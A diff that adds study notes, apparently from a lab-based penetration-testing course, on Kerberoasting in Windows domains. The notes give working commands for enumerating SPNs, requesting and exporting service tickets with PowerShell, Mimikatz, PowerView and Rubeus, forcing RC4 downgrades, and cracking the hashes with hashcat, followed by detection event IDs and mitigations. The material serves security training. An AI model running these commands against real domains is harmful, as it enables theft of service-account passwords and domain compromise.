@@ -1426,4 +1426,260 @@ SMB         172.16.5.5      445    <DC_NAME>  [+] <DOMAIN>\<USERNAME>:<PASSWORD>
 
 ---
 
+# Kerberoasting: Windows
+
+Kerberoasting is a post-exploitation technique used to extract and crack Kerberos tickets for sensitive service accounts in a Windows domain. Below is a detailed guide, providing both context and explanations for the commands involved in semi-manual and automated approaches.
+
+---
+
+### **1. Overview of Kerberoasting**
+- **Purpose**: 
+  - Retrieve Kerberos Ticket Granting Service (TGS) tickets for accounts with SPNs.
+  - Crack the encrypted tickets offline to reveal plaintext passwords.
+- **Prerequisites**:
+  - A foothold in the target domain (valid credentials for a domain account).
+  - Permission to request TGS tickets, which any authenticated domain user typically has.
+
+---
+
+### **2. Semi-Manual Method for Kerberoasting**
+
+This approach is helpful when automated tools are unavailable or blocked. It combines built-in Windows tools and manual extraction methods.
+
+---
+
+#### **Step 1: Enumerate Service Principal Names (SPNs)**
+- Use `setspn.exe` (a built-in Windows binary) to query the domain for SPNs.
+
+```shell
+C:\htb> setspn.exe -Q */*
+```
+
+- **Explanation**:
+  - The `-Q` flag queries for SPNs matching the wildcard `*/*`, which lists all SPNs in the domain.
+  - SPNs are unique identifiers for services running under specific accounts (e.g., `MSSQLSvc`, `backupjob`).
+  - Output includes **user accounts** and **computer accounts**. Focus on user accounts as these can have weak passwords.
+
+---
+
+#### **Step 2: Request TGS Tickets Using PowerShell**
+- Request a TGS ticket for a specific SPN.
+
+```powershell
+PS C:\htb> Add-Type -AssemblyName System.IdentityModel
+PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+- **Context and Explanation**:
+  1. **Add-Type**: Loads the `.NET Framework` library into the PowerShell session, enabling access to advanced Kerberos classes.
+     - **`System.IdentityModel`**: Namespace that includes Kerberos-related classes.
+  2. **New-Object**:
+     - Creates a `KerberosRequestorSecurityToken` object, requesting a TGS ticket for the specified SPN (`MSSQLSvc/DEV-PRE-SQL`).
+     - The ticket is loaded into memory for further processing.
+
+---
+
+#### **Step 3: Extract Tickets from Memory with Mimikatz**
+- Dump the loaded TGS tickets using Mimikatz.
+
+```shell
+mimikatz # kerberos::list /export
+```
+
+- **Explanation**:
+  - The `kerberos::list` command lists all Kerberos tickets in memory.
+  - The `/export` flag saves each ticket as a `.kirbi` file on disk.
+  - These `.kirbi` files are encrypted but can be cracked offline.
+
+---
+
+#### **Step 4: Prepare Tickets for Cracking**
+1. **Convert Base64-Encoded Tickets to .kirbi**:
+   - If the ticket was exported in Base64 format, convert it to `.kirbi`.
+   ```bash
+   echo "<base64 blob>" | tr -d \\n | base64 -d > sqldev.kirbi
+   ```
+   - **Explanation**: This command removes line breaks and decodes the Base64 string into the `.kirbi` binary format.
+
+2. **Extract Hashes for Cracking**:
+   - Use `kirbi2john.py` to extract the Kerberos hash from the `.kirbi` file.
+   ```bash
+   python2.7 kirbi2john.py sqldev.kirbi > crack_file
+   ```
+
+3. **Format the Hash for Hashcat**:
+   - Modify the extracted hash for compatibility with `hashcat`:
+   ```bash
+   sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+   ```
+
+4. **Crack the Hash**:
+   - Use `hashcat` to brute-force the hash offline:
+   ```bash
+   hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+   ```
+
+- **Hashcat Context**:
+  - **`-m 13100`**: Hashcat mode for cracking Kerberos 5 TGS-REP hashes using RC4 encryption.
+  - **Wordlist**: A file like `rockyou.txt` is used for dictionary-based brute-forcing.
+
+---
+
+### **3. Automated Methods for Kerberoasting**
+
+Automated tools simplify Kerberoasting by combining enumeration, ticket requests, and hash extraction into fewer steps.
+
+---
+
+#### **Using PowerView**
+1. **Import PowerView Module**:
+   - Load the PowerView script into the PowerShell session:
+   ```powershell
+   PS C:\htb> Import-Module .\PowerView.ps1
+   ```
+
+2. **Enumerate SPNs**:
+   - List all SPN-enabled user accounts in the domain:
+   ```powershell
+   PS C:\htb> Get-DomainUser * -spn | select samaccountname
+   ```
+
+3. **Retrieve Tickets**:
+   - Request a TGS ticket for a specific account and format it for `hashcat`:
+   ```powershell
+   PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+   ```
+
+4. **Export All Tickets**:
+   - Export tickets for all SPN-enabled accounts to a CSV file for offline processing:
+   ```powershell
+   PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+   ```
+
+---
+
+#### **Using Rubeus**
+1. **Basic Kerberoasting**:
+   - Request all TGS tickets in the domain:
+   ```powershell
+   PS C:\htb> .\Rubeus.exe kerberoast /nowrap
+   ```
+   - **Explanation**:
+     - `/nowrap`: Ensures Base64 ticket blobs are not wrapped across multiple lines.
+
+2. **Target Specific SPNs**:
+   - Request a TGS ticket for a specific SPN:
+   ```powershell
+   PS C:\htb> .\Rubeus.exe kerberoast /spn:"MSSQLSvc/SQLSERVER"
+   ```
+
+3. **Filter by Admin Accounts**:
+   - Target high-value accounts with the `admincount` attribute set:
+   ```powershell
+   PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+   ```
+
+4. **View Statistics**:
+   - View the encryption types and password last set dates for Kerberoastable accounts:
+   ```powershell
+   PS C:\htb> .\Rubeus.exe kerberoast /stats
+   ```
+---
+
+### **1. Encryption Types in Kerberoasting**
+
+#### **Encryption Type Overview**
+- **RC4 (etype 23)**:
+  - Easier and faster to crack.
+  - Most Kerberoasting tools default to requesting RC4-encrypted tickets.
+- **AES (etype 17/18)**:
+  - AES-128 (etype 17) and AES-256 (etype 18) are much harder to crack due to stronger encryption.
+  - Cracking AES-encrypted tickets requires significantly more resources and time.
+
+#### **Example: Checking Encryption Type with PowerView**
+```powershell
+PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+```
+
+- **Output**:
+  - **msds-supportedencryptiontypes = 0**: Defaults to RC4 encryption.
+  - **msds-supportedencryptiontypes = 24**: Supports AES-128/256 encryption only.
+
+---
+
+### **2. Key Commands for Kerberoasting**
+
+#### **Retrieve Tickets with RC4 Encryption**
+- Use **Rubeus** to request TGS tickets for a target SPN account:
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
+- **Output**:
+  - The hash will begin with `$krb5tgs$23$*`, indicating RC4 encryption.
+
+#### **Retrieve AES-Encrypted Tickets**
+- If the SPN account supports AES, tickets will begin with `$krb5tgs$18$*` (AES-256) or `$krb5tgs$17$*` (AES-128).
+
+---
+
+### **3. Cracking Kerberos Hashes**
+
+#### **For RC4-Encrypted Tickets**
+- Crack with Hashcat (etype 23, TGS-REP):
+```bash
+hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
+```
+
+#### **For AES-Encrypted Tickets**
+- Crack with Hashcat (etype 18, TGS-REP for AES-256):
+```bash
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+### **4. Downgrading to RC4 Encryption**
+- Use Rubeus to force RC4 encryption for accounts that support AES:
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
+```
+- **Note**: This method doesn’t work against Windows Server 2019 DCs, which enforce the highest available encryption type.
+
+---
+
+### **5. Detection and Mitigation**
+
+#### **Detection**
+1. **Enable Logging for Kerberos Service Ticket Operations**:
+   - Group Policy → `Audit Kerberos Service Ticket Operations`.
+2. **Monitor Event Logs**:
+   - **Event ID 4769**: Kerberos service ticket was requested.
+   - **Event ID 4770**: Kerberos service ticket was renewed.
+   - High volume of 4769 logs in a short time may indicate Kerberoasting.
+
+#### **Example Log Indicators**:
+- **Ticket Encryption Type**:
+  - **0x17**: RC4 encryption was used.
+  - **0x12**: AES-256 encryption was used.
+- **User Information**:
+  - Logs may show the attacker (e.g., `htb-student`) requesting tickets for target accounts (e.g., `sqldev`).
+
+---
+
+#### **Mitigation Strategies**
+1. **Strong Passwords**:
+   - Use long, complex passwords for service accounts.
+   - Avoid using dictionary words or weak phrases.
+2. **Managed Service Accounts**:
+   - Use **Managed Service Accounts (MSA)** or **Group Managed Service Accounts (gMSA)** with automatic password rotation.
+3. **Restrict RC4 Encryption**:
+   - Update Group Policy to remove RC4_HMAC_MD5 from allowed Kerberos encryption types.
+   - Test extensively before implementing to prevent operational issues.
+4. **Limit SPN Accounts**:
+   - Avoid assigning SPNs to high-privileged accounts like Domain Admins.
+
+---
+
+
 
